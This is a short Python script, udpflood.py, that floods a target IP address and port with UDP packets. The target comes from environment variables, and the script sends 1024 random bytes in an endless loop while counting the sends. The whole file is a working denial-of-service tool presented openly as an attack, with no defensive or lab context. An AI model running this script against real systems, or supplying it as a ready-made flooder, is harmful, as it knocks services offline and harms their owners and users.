"""
udpflood.py floods a TARGET_IP and TARGET_PORT with random packets
"""
import os
import random
import socket

try:
    ip = os.environ['TARGET_IP']  # The IP we are attacking
except KeyError:
    print('TARGET_IP variable not set')
try:
    port = int(os.environ['TARGET_PORT'])  # Port we direct to attack
except KeyError:
    print('TARGET_PORT variable not set')
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # Creates a socket
random_bytes = random._urandom(1024)  # Creates packet

sent = 0
while 1:
    sock.sendto(random_bytes, (ip, port))
    print('Sent {} amount of packets to {} at port {}'.format(sent, ip, port))
    sent += 1
